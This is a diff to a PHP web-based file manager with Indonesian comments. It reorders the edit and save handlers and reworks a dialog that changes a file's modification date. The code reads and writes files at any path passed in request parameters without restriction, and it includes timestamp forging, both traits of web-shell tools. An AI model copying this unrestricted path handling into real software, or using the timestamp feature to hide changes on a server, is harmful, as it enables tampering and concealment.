@@ -327,32 +327,12 @@ $home_directory = $_SESSION['home_directory'];
         <div class="main-window">
         <div class="text-center text-2xl py-4">
     <?php
-    if (isset($_GET['edit'])) {
-        $file_to_edit = $_GET['edit'];
-        if (file_exists($file_to_edit)) {
-            $file_name = basename($file_to_edit); // Dapatkan nama file
-            $content = file_get_contents($file_to_edit);
-    
-            echo '<h2 style="margin-bottom: 5px;">Edit File: ' . htmlspecialchars($file_name) . '</h2>';
-            echo '<form action="" method="post">
-                    <textarea name="file_content" rows="10" cols="50" style="width: 100%; font-size: 15px; box-sizing: border-box;">' . htmlspecialchars($content) . '</textarea>
-                    <input type="hidden" name="file_to_edit" value="' . htmlspecialchars($file_to_edit) . '">
-                    <input type="submit" name="save_edit" value="Save Changes" class="btn">
-                    <a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">
-                        <button type="button" class="btn">Back</button>
-                    </a>
-                  </form>';
-        } else {
-            echo '<div style="color: red; font-weight: bold;">File not found. The file you are trying to edit does not exist.</div>';
-            echo '<a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">Back</a>';
-        }
-    }
-    
     if (isset($_POST['save_edit'])) {
         $file_to_edit = $_POST['file_to_edit'];
         $file_content = $_POST['file_content'];
+
         if (file_put_contents($file_to_edit, $file_content) !== false) {
-            // Menyimpan file berhasil - SweetAlert untuk notifikasi sukses
+            // Berhasil menyimpan file
             echo "<script>
                     document.addEventListener('DOMContentLoaded', function() {
                         Swal.fire({
@@ -360,12 +340,12 @@ $home_directory = $_SESSION['home_directory'];
                             title: 'Success',
                             text: 'File saved successfully.'
                         }).then(() => {
-                            window.location.href = '?j=" . htmlspecialchars(urlencode(dirname($file_to_edit))) . "';
+                            window.location.href = '?edit=" . htmlspecialchars(urlencode($file_to_edit)) . "';
                         });
                     });
                   </script>";
         } else {
-            // Gagal menyimpan file - SweetAlert untuk notifikasi error
+            // Gagal menyimpan file
             echo "<script>
                     document.addEventListener('DOMContentLoaded', function() {
                         Swal.fire({
@@ -375,6 +355,27 @@ $home_directory = $_SESSION['home_directory'];
                         });
                     });
                   </script>";
+        }
+    }
+
+    if (isset($_GET['edit'])) {
+        $file_to_edit = $_GET['edit'];
+        if (file_exists($file_to_edit)) {
+            $file_name = basename($file_to_edit);
+            $content = file_get_contents($file_to_edit);
+    
+            echo '<h2 style="margin-bottom: 5px;">Edit File: ' . htmlspecialchars($file_name) . '</h2>';
+            echo '<form action="" method="post">
+                    <textarea name="file_content" rows="10" cols="50" style="width: 100%; font-size: 15px; border-box;">' . htmlspecialchars($content) . '</textarea>
+                    <input type="hidden" name="file_to_edit" value="' . htmlspecialchars($file_to_edit) . '">
+                    <input type="submit" name="save_edit" value="Save Changes" class="btn">
+                    <a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">
+                        <button type="button" class="btn">Back</button>
+                    </a>
+                  </form>';
+        } else {
+            echo '<div style="color: red; font-weight: bold;">File not found. The file you are trying to edit does not exist.</div>';
+            echo '<a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">Back</a>';
         }
     } else {
         // Tampilkan daftar file hanya jika tidak dalam mode edit
@@ -784,7 +785,7 @@ $home_directory = $_SESSION['home_directory'];
                         });
                       </script>";
             }
-        }
+        }        
         if (isset($_POST['upload'])) {
             $target_dir = isset($_GET['j']) ? rtrim($_GET['j'], '/') . '/' : './'; // Direktori tujuan
             $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
@@ -1014,36 +1015,34 @@ $home_directory = $_SESSION['home_directory'];
             });
         }
         function showTouchForm(filePath) {
-            Swal.fire({
-                title: 'Change Modification Date',
-                html: `
-                    <label for="newDate">Select a new date:</label>
-                    <input type="date" id="newDate" class="swal2-input">
-                    <label for="newTime">Select a new time:</label>
-                    <input type="time" id="newTime" class="swal2-input">
-                `,
-                showCancelButton: true,
-                confirmButtonText: 'Change Date',
-                preConfirm: () => {
-                    const newDate = document.getElementById('newDate').value;
-                    const newTime = document.getElementById('newTime').value;
-        
-                    if (!newDate || !newTime) {
-                        Swal.showValidationMessage('Please select both date and time');
-                    } else {
-                        return { newDate, newTime };
-                    }
-                }
-            }).then((result) => {
-                if (result.isConfirmed) {
-                    const { newDate, newTime } = result.value;
-                    const newDateTime = `${newDate} ${newTime}:00`; // Format tanggal & waktu
-        
-                    // Redirect ke PHP handler dengan parameter
-                    window.location.href = `?touch=${encodeURIComponent(filePath)}&newDateTime=${encodeURIComponent(newDateTime)}`;
-                }
-            });
+    Swal.fire({
+        title: 'Change Modification Date',
+        html: `
+            <label for="newDateTime">Paste the new date & time:</label>
+            <input type="text" id="newDateTime" class="swal2-input" placeholder="YYYY-MM-DD HH:MM:SS">
+        `,
+        showCancelButton: true,
+        confirmButtonText: 'Change Date',
+        preConfirm: () => {
+            const newDateTime = document.getElementById('newDateTime').value.trim();
+            
+            // Validasi format tanggal & waktu yang benar
+            const dateTimeRegex = /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/;
+            if (!dateTimeRegex.test(newDateTime)) {
+                Swal.showValidationMessage('Invalid format! Use YYYY-MM-DD HH:MM:SS');
+            } else {
+                return newDateTime;
+            }
         }
+    }).then((result) => {
+        if (result.isConfirmed) {
+            const newDateTime = result.value;
+            
+            // Redirect ke PHP handler dengan parameter
+            window.location.href = `?touch=${encodeURIComponent(filePath)}&newDateTime=${encodeURIComponent(newDateTime)}`;
+        }
+    });
+}
         function showBackupForm() {
     Swal.fire({
         title: 'Backup Files',
